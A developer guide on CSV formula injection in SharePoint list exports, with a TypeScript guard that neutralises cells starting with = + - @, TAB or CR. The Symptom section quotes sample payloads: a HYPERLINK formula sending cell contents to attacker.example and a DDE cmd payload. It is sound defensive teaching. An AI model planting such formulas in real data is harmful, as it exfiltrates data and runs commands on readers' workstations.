---
title: CSV export of list data hands Excel a formula, not text
tags: [security, spfx, export, csv, stored-injection]
applies-to: SharePoint Online (any client exporting list/library data to CSV)
last-reviewed: 2026-07-25
---

# CSV export of list data hands Excel a formula, not text

> **Bottom line.** A list column is writable by ordinary members, and a value starting with `= + - @` (or a leading TAB/CR) is executed by Excel when the exported CSV is opened — the export button turns your read-only report into a code-execution path on the *reader's* workstation. Prefix such values with `'` at export time; quoting alone does not disarm them.
>
> **Ve zkratce.** Sloupec v listu smí psát běžný člen a hodnota začínající `= + - @` (nebo vedoucím TABem/CR) se při otevření exportovaného CSV v Excelu **spustí** – tlačítko Export tak z read-only reportu udělá cestu ke spuštění kódu na počítači toho, kdo report otevře. Při exportu takové hodnoty prefixuj apostrofem; samotné uvozovky je nezneškodní.

## Symptom

A perfectly ordinary reporting feature: a web part reads a list and offers **Export to CSV**. A member types this into a plain text column (title, description, comment, customer name):

```
=HYPERLINK("https://attacker.example/?d="&A1&A2,"Click for details")
```

Someone else exports the report and opens it in Excel. The cell is not text — it is a live formula that renders as an innocuous link and exfiltrates neighbouring cells when clicked. Variants call `WEBSERVICE()`, or with legacy DDE enabled, launch a local process via `=cmd|'/c calc'!A0`.

Nothing in SharePoint flags this. The list shows the text verbatim, your web part renders it verbatim (it is not HTML, so an XSS sanitizer never looks at it), and the CSV is syntactically valid.

## Cause

Two separate rules meet:

1. **Excel/Sheets decide "formula vs. text" from the first character** of an unquoted *and* quoted cell: `=`, `+`, `-`, `@` start a formula. A leading TAB or CR is stripped first, so `<TAB>=cmd…` is a formula too (that's why OWASP lists them alongside).
2. **CSV quoting is about the parser, not the evaluator.** Wrapping the cell in `"…"` only tells the CSV reader where the field ends. Excel unquotes the field, *then* evaluates it. So the usual `if it contains ; or " → quote it` escaping — the only escaping most exporters do — leaves the payload fully armed.

The payload is stored, not reflected: it sits in the list until someone exports. So the person who runs the risk is a reader/manager, typically with wider permissions than the member who planted it.

## Fix

Prefix any value whose first character is dangerous with a single apostrophe **before** the normal CSV quoting, and apply it to *every* field — including numbers converted to strings and columns you believe are system-generated:

```ts
/** CSV formula-injection guard. Quoting/delimiters stay the caller's job. */
export function csvSafe(v: string | number | null | undefined): string {
  const s = v == null ? '' : String(v);
  return /^[=+\-@\t\r]/.test(s) ? "'" + s : s;
}

// usage — guard first, quote second
const cell = csvSafe(raw);
const out = /[",\r\n;]/.test(cell) ? '"' + cell.split('"').join('""') + '"' : cell;
```

The apostrophe is consumed by Excel as the "treat as text" marker, so the reader sees the original string.

## Notes

- **Guard first, quote second.** Reversed, the `'` lands inside the quotes but after them logically, and some readers show a stray apostrophe while others still evaluate.
- **Also quote lone CR.** A value containing a bare `\r` (no `\n`) splits the record in Excel; the tail then starts a fresh cell that may begin with `=`. Include `\r` in the "needs quoting" test, not just `\n`.
- Same exposure applies to **anything downstream that opens the file as a spreadsheet**: mail attachments, Power Automate "create file" flows, an archive handed to an auditor.
- This is the export-time sibling of stored XSS (`gotchas/security/stored-xss-from-list-content.md`): the same untrusted list column, a different rendering engine. An app that sanitizes HTML but pipes raw text into CSV has closed one exit and left the other open.
- Numbers are not safe by construction — a negative number renders as `-5`, which starts with `-`. Excel parses `-5` fine, but `-5+cmd…` is a formula, so run *every* cell through the guard rather than reasoning per column.
